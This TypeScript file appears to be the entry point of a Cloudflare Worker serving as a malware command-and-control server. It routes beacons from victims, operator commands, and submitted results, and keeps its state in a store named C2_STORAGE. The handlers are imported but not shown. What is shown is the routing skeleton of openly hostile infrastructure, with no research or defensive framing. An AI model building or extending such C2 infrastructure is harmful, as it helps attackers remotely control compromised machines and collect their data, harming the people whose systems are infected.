import { getVictims } from "./routes/victims"
import { beacon } from "./routes/beacon"
import { issueCommand } from "./routes/command"
import { submitResult } from "./routes/result"
import { getResults } from "./routes/results"

export interface Env {
  ADMIN_TOKEN: string
  C2_STORAGE: KVNamespace
  RESULTS_DB: D1Database
}

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Authorization, Content-Type",
  "Access-Control-Max-Age": "86400"
}

function withCors(response: Response): Response {
  const headers = new Headers(response.headers)
  for (const [key, value] of Object.entries(corsHeaders)) {
    headers.set(key, value)
  }
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers
  })
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url)

    // ✅ GLOBAL OPTIONS HANDLER (CRITICAL)
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: corsHeaders
      })
    }

    let response: Response

    if (request.method === "GET" && url.pathname === "/api/victims") {
      response = await getVictims(request, env)
    }
    else if (request.method === "POST" && url.pathname === "/beacon") {
      response = await beacon(request, env)
    }
    else if (request.method === "POST" && url.pathname === "/api/command") {
      response = await issueCommand(request, env)
    }
    else if (request.method === "POST" && url.pathname === "/api/result") {
      response = await submitResult(request, env)
    }
    else if (request.method === "GET" && url.pathname === "/api/results") {
      response = await getResults(request, env)
    }
    else {
      response = new Response("Not Found", { status: 404 })
    }

    // ✅ ALWAYS ADD CORS
    return withCors(response)
  }
}
